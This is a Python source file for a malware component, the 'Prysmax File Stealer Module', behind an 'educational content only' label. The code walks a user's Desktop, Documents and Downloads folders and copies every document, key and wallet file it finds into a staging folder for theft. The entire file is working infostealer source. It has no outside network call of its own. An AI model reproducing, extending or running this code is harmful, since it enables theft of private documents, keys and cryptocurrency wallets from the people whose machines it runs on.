#!/usr/bin/env python3
"""
Prysmax File Stealer Module
Educational content only
"""

import os
import sys
import shutil

class FileStealer:
    def __init__(self, output_dir, config):
        self.output_dir = output_dir
        self.config = config
        self.target_extensions = config.get("stealer", {}).get("file_extensions", [
            ".txt", ".doc", ".docx", ".pdf", ".key", ".wallet", ".dat"
        ])
        
    def steal(self):
        """Steal specific files"""
        try:
            files_dir = os.path.join(self.output_dir, "Files")
            os.makedirs(files_dir, exist_ok=True)
            
            # Search common directories
            search_dirs = [
                os.path.expanduser("~\\Desktop"),
                os.path.expanduser("~\\Documents"),
                os.path.expanduser("~\\Downloads")
            ]
            
            for search_dir in search_dirs:
                if os.path.exists(search_dir):
                    self.search_directory(search_dir, files_dir)
                    
        except Exception as e:
            print(f"[FILES] General error: {e}")
    
    def search_directory(self, search_dir, output_dir):
        """Search directory for target files"""
        try:
            for root, dirs, files in os.walk(search_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    _, ext = os.path.splitext(file)
                    
                    if ext.lower() in self.target_extensions:
                        try:
                            # Create subdirectory structure
                            rel_path = os.path.relpath(root, search_dir)
                            dest_dir = os.path.join(output_dir, os.path.basename(search_dir), rel_path)
                            os.makedirs(dest_dir, exist_ok=True)
                            
                            # Copy file
                            dest_path = os.path.join(dest_dir, file)
                            shutil.copy2(file_path, dest_path)
                            
                        except Exception as e:
                            print(f"[FILES] Error copying {file}: {e}")
                            
        except Exception as e:
            print(f"[FILES] Error searching {search_dir}: {e}")

